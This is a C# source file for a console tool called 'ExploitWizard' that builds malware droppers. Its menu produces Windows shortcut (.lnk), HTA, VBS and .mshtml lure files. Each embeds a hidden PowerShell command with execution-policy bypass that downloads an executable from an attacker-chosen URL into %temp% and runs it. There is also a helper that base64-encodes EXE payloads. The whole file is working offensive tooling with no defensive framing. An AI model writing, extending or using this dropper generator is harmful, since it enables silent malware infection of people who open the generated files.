using System;
using Microsoft.Win32;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace ExploitWizard
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                Console.Clear();
                Console.WriteLine("Commands:");
                Console.WriteLine("encode");
                Console.WriteLine("lnk");
                Console.WriteLine("hta");
                Console.WriteLine("vbs");
                Console.WriteLine("html");
                Console.WriteLine("");
                Console.WriteLine("Enter Command : ");
                string command = Console.ReadLine();
                Console.Clear();
                Console.WriteLine("");

                switch (command.ToLower())
                {
                    default:
                        Console.WriteLine("Error: Unknown Command");
                        Console.ReadLine();
                        break;
                    case "exit":
                        return;
                    case "encode":
                        Console.WriteLine("Enter the path of the EXE file:");
                        string exePath = Console.ReadLine();
                        try
                        {
                            byte[] exeBytes = File.ReadAllBytes(exePath);
                            string b64String = Convert.ToBase64String(exeBytes);
                            File.WriteAllText(exePath + ".b64", b64String);
                            Console.WriteLine("EXE file successfully converted to .b64 file.");
                            Console.Beep();
                            Process.Start("explorer.exe", "/select," + Path.GetDirectoryName(exePath));
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Error: " + ex.Message);
                        }
                        break;
                    case "lnk":
                        Console.WriteLine("Enter The Direct URL for The EXE file: ");
                        string lnkpayload = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Enter The Desired Name For The Dropped Payload: ");
                        string flnm = "%temp%\\" + Console.ReadLine() + ".exe";
                        Console.WriteLine("");
                        Console.WriteLine("Enter The Desired Name For The Exploit Shortcut File: ");
                        string exp = Console.ReadLine() + ".lnk";
                        string target = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                        string arguments = " -NoProfile -ExecutionPolicy Bypass -command `Invoke-WebRequest -Uri " + lnkpayload + " -OutFile " + flnm + ";Start-Process " + flnm;
                        IWshRuntimeLibrary.WshShell wshShell = new IWshRuntimeLibrary.WshShell();
                        IWshRuntimeLibrary.IWshShortcut shortcutFile = (IWshRuntimeLibrary.IWshShortcut)wshShell.CreateShortcut(exp);
                        shortcutFile.TargetPath = target;
                        shortcutFile.Arguments = arguments;
                        shortcutFile.Hotkey = "Ctrl+A";
                        shortcutFile.WindowStyle = 1;
                        shortcutFile.Save();
                        Console.Beep();
                        string shortcutFilePath = Path.Combine(Directory.GetCurrentDirectory(), exp);
                        Process.Start("explorer.exe", "/select," + shortcutFilePath);
                        break;
                    case "hta":
                        Console.WriteLine("Enter the direct URL or base64 string for the payload:");
                        string htapayload = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Enter the desired name for the HTA file: ");
                        string htaName = Console.ReadLine() + ".hta";
                        string htaFilePath = Path.Combine(Directory.GetCurrentDirectory(), htaName);
                        using (StreamWriter sw = new StreamWriter(htaFilePath, false, Encoding.UTF8))
                        {
                            sw.WriteLine("<html>");
                            sw.WriteLine("<head>");
                            sw.WriteLine("<script>");
                            sw.WriteLine("var objShell = new ActiveXObject(\"Wscript.Shell\");");
                            sw.WriteLine("objShell.Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri " + htapayload + " -OutFile %temp%\\payload.exe;Start-Process %temp%\\payload.exe\", 0);");
                            sw.WriteLine("</script>");
                            sw.WriteLine("</head>");
                            sw.WriteLine("<body>");
                            sw.WriteLine("</body>");
                            sw.WriteLine("</html>");
                        }
                        Console.Beep();
                        Process.Start("explorer.exe", "/select," + htaFilePath);
                        break;
                    case "html":
                        Console.WriteLine("Enter the direct URL for the payload:");
                        string htmlpayload = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Enter the desired name for the HTML file:");
                        string htmlName = Console.ReadLine() + ".mshtml";
                        string htmlFilePath = Path.Combine(Directory.GetCurrentDirectory(), htmlName);
                        using (StreamWriter sw = new StreamWriter(htmlFilePath, false, Encoding.UTF8))
                        {
                            sw.WriteLine("<html>");
                            sw.WriteLine("<head>");
                            sw.WriteLine("<script>");
                            sw.WriteLine("var objShell = new ActiveXObject(\"Wscript.Shell\");");
                            sw.WriteLine("objShell.Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri " + htmlpayload + " -OutFile %temp%\\payload.exe;Start-Process %temp%\\payload.exe\", 0);");
                            sw.WriteLine("</script>");
                            sw.WriteLine("</head>");
                            sw.WriteLine("<body>");
                            sw.WriteLine("</body>");
                            sw.WriteLine("</html>");
                        }
                        Console.Beep();
                        Process.Start("explorer.exe", "/select," + htmlFilePath);
                        break;
                    case "vbs":
                        Console.WriteLine("Enter the direct URL for the payload:");
                        string vbspayload = Console.ReadLine();
                        Console.WriteLine("");
                        Console.WriteLine("Enter the desired name for the VBS file:");
                        string vbsName = Console.ReadLine() + ".vbs";

                        string vbsFilePath = Path.Combine(Directory.GetCurrentDirectory(), vbsName);
                        using (StreamWriter sw = new StreamWriter(vbsFilePath, false, Encoding.UTF8))
                        {
                            sw.WriteLine("Set objShell = CreateObject(\"Wscript.Shell\")");
                            sw.WriteLine("objShell.Run \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri " + vbspayload + " -OutFile %temp%\\payload.exe;Start-Process %temp%\\payload.exe\", 0);");
                        }
                        Console.Beep();
                        Process.Start("explorer.exe", "/select," + vbsFilePath);
                        break;

                }
            }
        }
    }
}